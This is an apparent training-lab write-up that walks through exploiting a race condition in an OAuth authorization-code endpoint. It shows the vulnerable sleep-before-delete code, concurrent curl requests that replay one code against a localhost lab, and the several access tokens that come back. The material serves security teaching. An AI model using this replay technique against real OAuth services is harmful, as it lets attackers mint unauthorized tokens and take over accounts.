# Exercise 8
This is an exercise that exploits the race condition vulnerability in authorization code. The goal is to issue multiple access tokens using a authorization code.

## Setup
```
$ git clone https://github.com/melonattacker/oauth-exploit-lab.git
$ cd oauth-exploit-lab/exercise/ex8
$ docker-compose up -d
```
### URL
|  target  |  URL  |
| ---- | ---- |
|  client  |  `http://localhost:10000`  |

### Account
|  username  |  password  |
| ---- | ---- |
|  bob(attacker)  |  hoge  |

## Writeup

In `authozationServer/app.py`, sleep is included just before the process of deleting the authorization code from db.
```
@app.route("/token", methods=["POST"])
def token():
    ...
    code = res[0]
            
    time.sleep(10) # something heavy processing
    
    db.remove(Code.code == request.form.get('code'))
    ...
```

This makes it vulnerable to [race condition](https://www.veracode.com/security/race-condition) vulnerability in authorization code. To exploit this, an attacker sends multiple token issuance requests at the same time.

First login as bob(attacker), and click `Get OAuth Token` button. Capture the request with burp suite and forward. Copy the query parameters including authorization code and state.

<img width="703" alt="スクリーンショット 2022-09-19 9 52 58" src="https://user-images.githubusercontent.com/41631269/190935835-204bb0ec-f021-47ad-9254-e6b9a3560fe4.png">


```
curl -b "session=eyJuYW1lIjoiYm9iIn0.YyeqYQ.2z4sigS16CVoOcOwlktKV8BxRFw" "http://localhost:10000/callback?code=RKDH10LV&state=BZXPXW8WRU8U1839UZCAONVIN9OBUBTC" &
...
< ... previous line repeated 10 times ... >
```

Multiple access tokens are issued.
```
<p>Access token value: <span class="label label-danger">Y6T4LUBJNR345Y2ZDV482TZSM7TNWNSVDBQM4DKFK5S38WXMPOYXVFX0EBOL1K2D</span></p>
...
<p>Access token value: <span class="label label-danger">EF5G0UE4FZK7J89LDAQE8WJR59SLOLVA344PKSRSDFQDSPY99Y8NK7IU4KCZQ6LN</span></p>
...
<p>Access token value: <span class="label label-danger">ED1H3FA0523NK2SJ5280C1TBFNIOUVFHUTBLGSSZS25Q0Q40R93E3M31DDUHPQF9</span></p>
```

Access `http://localhost:10000/fetch_resource?access_token=<access token>` with a browser and check the validity of the access token.

<img width="1290" alt="スクリーンショット 2022-09-19 10 01 08" src="https://user-images.githubusercontent.com/41631269/190935860-3eeb445d-3a0c-4989-a6fd-4861554a502d.png">

Empty the contents of `db.json` after you're done. 